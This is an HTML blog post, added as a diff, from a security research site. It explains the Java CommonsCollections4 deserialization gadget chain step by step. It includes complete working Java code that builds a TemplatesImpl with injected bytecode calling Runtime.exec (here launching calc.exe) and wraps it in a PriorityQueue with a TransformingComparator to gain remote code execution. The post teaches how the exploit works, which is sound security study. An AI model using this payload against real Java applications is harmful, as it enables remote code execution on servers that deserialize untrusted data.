@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CommonsCollection4 | zdaylabs</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 32 32%27%3E%3Crect width=%2732%27 height=%2732%27 rx=%277%27 fill=%27%237c9cff%27/%3E%3Ctext x=%2716%27 y=%2723%27 font-size=%2720%27 font-weight=%27800%27 text-anchor=%27middle%27 fill=%27%23090b10%27 font-family=%27sans-serif%27%3EZ%3C/text%3E%3C/svg%3E">
+  <link rel="stylesheet" href="style.css">
+  <meta name="theme-color" content="#090b10">
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="index.html" aria-label="ZDaylabs home"><span class="brand-mark" aria-hidden="true">Z</span>ZDaylabs</a>
+    <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav" aria-label="Toggle navigation"><span></span></button>
+    <nav class="site-nav" id="site-nav" aria-label="Primary">
+      <a href="index.html">Home</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="research.html">Research</a>
+      <a href="policy.html">Disclosure</a>
+      <a href="contact.html">Contact</a>
+      <span class="nav-social">
+        <a href="https://www.linkedin.com/in/swagatkumar/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+        <a href="https://x.com/webspl01t3r" target="_blank" rel="noopener noreferrer">X</a>
+      </span>
+    </nav>
+  </div>
+</header>
+
+
+  <main id="main" class="article">
+<h1>CommonsCollection4</h1>
+
+<p>
+  Just like <strong>CommonsCollections1</strong> and <strong>CommonsCollections3</strong>, <strong>CommonsCollections2</strong> and <strong>CommonsCollections4</strong> are essentially the same, with a few differences.
+</p>
+<p>
+  Instead of using only the <strong>InvokerTransformer</strong>, we use a chain of <strong>ConstantTransformer</strong> and <strong>InstantiateTransformer</strong>, and pass it to the <strong>TransformingComparator</strong>.<br>
+  The rest remains the same.
+</p>
+<p>So, let's jump straight into the payload and see how it works.</p>
+<p>Since we already covered how <code>InstantiateTransformer</code> works in CommonsCollections3, here we'll focus on its interaction with <code>PriorityQueue</code>.</p>
+<p>If you're not familiar with <code>InstantiateTransformer</code>, I recommend reviewing CommonsCollections2 first.</p>
+<p>With that said, here's what the payload looks like:</p>
+
+<p>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Object</span> templates = <span style="color: #cf8e6d;">Gadgets</span>.<span style="color: #56a8f5;">createTemplatesImpl</span>(command); <span style="color: #808080;">//1</span>
+
+<span style="color: #cf8e6d;">ConstantTransformer</span> constant = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>); <span style="color: #808080;">//2</span>
+
+<span style="color: #808080;">// 3</span>
+<span style="color: #cf8e6d;">Class</span>[] paramTypes = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[] { <span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span> };
+<span style="color: #cf8e6d;">Object</span>[] args = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[] { <span style="color: #6aab73;">"foo"</span> };
+<span style="color: #cf8e6d;">InstantiateTransformer</span> instantiate = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InstantiateTransformer</span>(
+        paramTypes, args);
+
+<span style="color: #808080;">// 4</span>
+paramTypes = (<span style="color: #cf8e6d;">Class</span>[]) <span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">getFieldValue</span>(instantiate, <span style="color: #6aab73;">"iParamTypes"</span>);
+args = (<span style="color: #cf8e6d;">Object</span>[]) <span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">getFieldValue</span>(instantiate, <span style="color: #6aab73;">"iArgs"</span>);
+
+<span style="color: #cf8e6d;">ChainedTransformer</span> chain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[] { constant, instantiate });
+
+<span style="color: #808080;">// 5</span>
+<span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt; queue = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TransformingComparator</span>(chain));
+queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+
+<span style="color: #808080;">// 6</span>
+<span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">setFieldValue</span>(constant, <span style="color: #6aab73;">"iConstant"</span>, <span style="color: #cf8e6d;">TrAXFilter</span>.<span style="color: #cf8e6d;">class</span>);
+paramTypes[<span style="color: #b3ae60;">0</span>] = <span style="color: #cf8e6d;">Templates</span>.<span style="color: #cf8e6d;">class</span>;
+args[<span style="color: #b3ae60;">0</span>] = templates;
+
+<span style="color: #cf8e6d;">return</span> queue;</pre></div>
+</p>
+<p>
+  Instead of using <strong>InvokerTransformer</strong>, we use <strong>InstantiateTransformer</strong>.<br>
+  As you know, <code>InstantiateTransformer</code> takes a class and <em>initializes</em> it with the arguments we provide.<br>
+  Why we use <code>TrAXFilter.class</code> (and related details) was already discussed in CC3.
+</p>
+
+<p>
+  Let's focus on what the code above does.
+</p>
+
+<p>
+  At <strong>[1]</strong> we instantiate a <strong>ConstantTransformer</strong> with <code>String.class</code>. Once a <code>ConstantTransformer</code> is created, it <em>cannot</em> change its return value (without reflection).  
+  So it always returns <code>String.class</code>.
+</p>
+
+<p>
+  At <strong>[3]</strong> we prepare the constructor parameter types and arguments for <strong>InstantiateTransformer</strong> and pass them in.<br>
+  We choose <code>String.class</code> and <code>"foo"</code> because the <strong>InstantiateTransformer</strong> will look for a constructor on the class provided by the previous transformer (currently <code>String.class</code>) whose signature matches the given parameter types, and then call it with the provided arguments.<br>
+  Since <code>String</code> has a constructor <code>String(String)</code>, we pass <code>"foo"</code> as the value.
+</p>
+
+<p>
+  At <strong>[4]</strong> we read the fields <code>iParamTypes</code> and <code>iArgs</code> from the <strong>InstantiateTransformer</strong> (via reflection) so we can replace them with our own values later.
+</p>
+
+<p>
+  At <strong>[5]</strong> we create a <code>PriorityQueue</code> with a <strong>TransformingComparator</strong> that wraps our <strong>ChainedTransformer</strong>, and then add elements to the queue.  
+  These become the <code>obj1</code> and <code>obj2</code> seen in <code>TransformingComparator.compare()</code>.
+</p>
+
+<p>
+  At <strong>[6]</strong> we change the constant inside <strong>ConstantTransformer</strong> from <code>String.class</code> to <code>TrAXFilter.class</code>.
+</p>
+
+<p>
+  Now, if we put all of the above together…
+</p>
+
+<ul>
+  <li>Instantiate the <code>ConstantTransformer</code> with <code>TrAXFilter.class</code></li>
+  <li>Instantiate the <code>InstantiateTransformer</code> with <code>Templates.class</code> and the value as <code>templates</code> (that we obtained from step 1)</li>
+  <li>Create the <code>ChainedTransformer</code> with <code>ConstantTransformer</code> and <code>InstantiateTransformer</code></li>
+  <li>Instantiate the <code>PriorityQueue</code> with the <code>TransformingComparator</code> using <code>ChainedTransformer</code> as the transformer</li>
+  <li>Add any random value into the <code>PriorityQueue</code></li>
+</ul>
+
+<br>
+So the whole above code can look like below
+</p>
+<div style="background-color: #0d1117; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">
+  <span style="color: #cf8e6d;">Object</span> templates = <span style="color: #cf8e6d;">Gadgets</span>.<span style="color: #56a8f5;">createTemplatesImpl</span>(command);
+  <span style="color: #cf8e6d;">ConstantTransformer</span> constant = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">TrAXFilter</span>.<span style="color: #cf8e6d;">class</span>);
+  <span style="color: #cf8e6d;">Class</span>[] paramTypes = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[] { <span style="color: #cf8e6d;">Templates</span>.<span style="color: #cf8e6d;">class</span> };
+  <span style="color: #cf8e6d;">Object</span>[] argst = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[] { templates };
+  <span style="color: #cf8e6d;">InstantiateTransformer</span> instantiate = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InstantiateTransformer</span>(paramTypes, argst);
+  <span style="color: #cf8e6d;">ChainedTransformer</span> chain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[] { constant, instantiate });
+  <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt; queue = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TransformingComparator</span>(chain));
+  queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+  queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+  </pre>
+  </div>
+  
+
+<p>Question:<br>
+    How are we adding  1 into priority Queue but still achieving Code Execution?</p>
+    <p>
+        Answer:<br>
+        So whatever we add into the priorityQueue as queue.add never gets used.
+<br>
+So From the priorityQueue the code flows to the transFormingCompartor.compare().
+<br>
+Here the obj1 and obj2 are the values we pass via queue.add()
+<br>
+Now in the transformer.apply() , here the transformer is ChainedTransFormer, and if you see the chainedTrasformer's transform Code
+    </p>
+    <div style="background-color: #0d1117; color: #bcbec4;">
+      <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+      <span style="color: #cf8e6d;">@Override</span>
+      <span style="color: #cf8e6d;">public</span> T <span style="color: #56a8f5;">transform</span>(T object) {
+          <span style="color: #cf8e6d;">for</span> (<span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Transformer</span>&lt;? <span style="color: #cf8e6d;">super</span> T, ? <span style="color: #cf8e6d;">extends</span> T&gt; iTransformer : iTransformers) {
+              object = iTransformer.<span style="color: #56a8f5;">apply</span>(object);
+          }
+          <span style="color: #cf8e6d;">return</span> object;
+      }
+      </pre>
+      </div>
+      
+<p>
+    So it iterates over the list , inout case its ConstantTransformer and InstantiateTransformer and calls the transForm() on them.
+ <li>
+  <ul>
+    once we Instantiate ConstantTransformer () no matter what we pass to the transform() it will alwasy return the instantied Value and in our case it will be TraXFilter.class
+  </ul>
+  <ul>
+    - For the InstantiateTransformer , the Object Passed from the queue.add has alredybeen overwritten from the output of ConstantTransformer due to the Below code
+  </ul>
+ </li>
+
+</code></pre>
+</p>
+<div style="background-color: #0d1117; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+  object = iTransformer.<span style="color: #56a8f5;">apply</span>(object);
+  </pre>
+  </div>
+  
+<p>
+  Even if we pass <code>1</code> via <code>queue.add()</code>, by the time it reaches the <strong>InstantiateTransformer</strong> it has already been replaced by <code>TrAXFilter.class</code> by the preceding <strong>ConstantTransformer</strong>.<br>
+  That's why it doesn't matter whether we add <code>1</code>, <code>2</code>, or any other value. (Note: since we're using a <code>PriorityQueue&lt;Object&gt;</code>, we can enqueue any object; if you use a typed queue, you'll be restricted by that element type.)
+</p>
+<p>
+  With that in mind, the modified code — including <code>TemplatesImpl</code> creation — for the CommonsCollections4 gadget looks like this:
+</p>
+
+
+<div style="background-color: #0d1117; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+  <span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+  <span style="color: #cf8e6d;">import</span> javassist.ClassClassPath;
+  <span style="color: #cf8e6d;">import</span> javassist.ClassPool;
+  <span style="color: #cf8e6d;">import</span> javassist.CtClass;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+  <span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
+  <span style="color: #cf8e6d;">import</span> javax.xml.transform.Templates;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.functors.*;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.Transformer;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+  
+  <span style="color: #cf8e6d;">public class</span> cc4 {
+      <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">Exception</span> {
+          <span style="color: #cf8e6d;">String</span> command = <span style="color: #6aab73;">"calc.exe"</span>;
+          <span style="color: #cf8e6d;">ClassPool</span> pool = <span style="color: #cf8e6d;">ClassPool</span>.<span style="color: #56a8f5;">getDefault</span>();
+  
+          <span style="color: #808080;">/*
+           * So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call
+           * clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName());
+           * clazz.setSuperclass(superC);
+           *
+           * Reason for calling the above 2 are.
+           * 1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
+           * AbstractTranslet.class or else TemplatesIMPL will not execute it(Figure out why)
+           */</span>
+  
+          <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">CtClass</span> clazz = pool.<span style="color: #56a8f5;">get</span>(cc4.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>()); 
+          <span style="color: #cf8e6d;">String</span> cmd = <span style="color: #6aab73;">"java.lang.Runtime.getRuntime().exec(\""</span> +
+              command.<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\\"</span>, <span style="color: #6aab73;">"\\\\"</span>).<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\""</span>, <span style="color: #6aab73;">"\\\""</span>) +
+              <span style="color: #6aab73;">"\");"</span>;
+          clazz.<span style="color: #56a8f5;">makeClassInitializer</span>().<span style="color: #56a8f5;">insertAfter</span>(cmd);
+          <span style="color: #cf8e6d;">CtClass</span> superC = pool.<span style="color: #56a8f5;">get</span>(AbstractTranslet.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+          clazz.<span style="color: #56a8f5;">setSuperclass</span>(superC);
+          <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">byte</span>[] classBytes = clazz.<span style="color: #56a8f5;">toBytecode</span>();
+  
+          <span style="color: #cf8e6d;">byte</span>[] maliciousBytecode = classBytes;
+  
+          <span style="color: #808080;">/*
+           * Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
+           * _tfactory , as these are necessary fields.
+           * Why can't we use the normal getters and setters(FigureOut)
+           */</span>
+  
+          <span style="color: #cf8e6d;">TemplatesImpl</span> templates = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TemplatesImpl</span>();
+  
+          <span style="color: #cf8e6d;">Field</span> bytecodesField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_bytecodes"</span>);
+          bytecodesField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          bytecodesField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">byte</span>[][]{maliciousBytecode});
+  
+          <span style="color: #cf8e6d;">Field</span> nameField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_name"</span>);
+          nameField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          nameField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #6aab73;">"Exploit"</span>);
+  
+          <span style="color: #cf8e6d;">Field</span> tfacname = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_tfactory"</span>);
+          tfacname.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          tfacname.<span style="color: #56a8f5;">set</span>(templates, TransformerFactoryImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">newInstance</span>());
+  
+          <span style="color: #808080;">//templates.newTransformer();</span>
+  
+          <span style="color: #cf8e6d;">ConstantTransformer</span> constant = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(TrAXFilter.<span style="color: #cf8e6d;">class</span>);
+          <span style="color: #cf8e6d;">Class</span>[] paramTypes = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[] { Templates.<span style="color: #cf8e6d;">class</span> };
+          <span style="color: #cf8e6d;">Object</span>[] argst = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[] { templates };
+          <span style="color: #cf8e6d;">InstantiateTransformer</span> instantiate = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InstantiateTransformer</span>(paramTypes, argst);
+          <span style="color: #cf8e6d;">ChainedTransformer</span> chain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[] { constant, instantiate });
+          <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt; queue = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TransformingComparator</span>(chain));
+          queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+          queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+      }
+  }
+  </pre>
+  </div>
+  
+<p>
+    <img src="images/cc/cc4popup.PNG">
+</p>
+
+<p>
+    This is how the CommonsCollection4 Payload works, staring from the EntryPoint to Code Execution
+</p>
+
+
+<h4>Summary:</h4>
+<ul>
+  <li>The payload uses a combination of <code>ConstantTransformer</code> and <code>InstantiateTransformer</code> chained together.</li>
+  <li><code>ConstantTransformer</code> always returns <code>TrAXFilter.class</code>, regardless of input.</li>
+  <li><code>InstantiateTransformer</code> attempts to create a new instance of <code>TrAXFilter</code> using a <code>TemplatesImpl</code> object we control.</li>
+  <li>A <code>TransformingComparator</code> is created using the above chained transformer, and passed to a <code>PriorityQueue</code>.</li>
+  <li>When the queue is deserialized or sorted, <code>compare()</code> calls <code>transform()</code> on the chained transformers.</li>
+  <li>Even though we added integers (1, 1) to the queue, the values are overwritten by the transformer logic during comparison.</li>
+  <li>This leads to <code>TrAXFilter</code> instantiation → triggering the bytecode in <code>TemplatesImpl</code> → RCE.</li>
+</ul>
+
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+  </main>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span>&copy; 2025 ZDaylabs. We exploit, analyze, and document.</span>
+    <nav class="footer-links" aria-label="Footer">
+      <a href="research.html">Research</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="policy.html">Disclosure policy</a>
+      <a href="https://github.com/w3bspl01t3r" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </nav>
+  </div>
+</footer>
+<script src="navigation.js" defer></script>
+</body>
+</html>
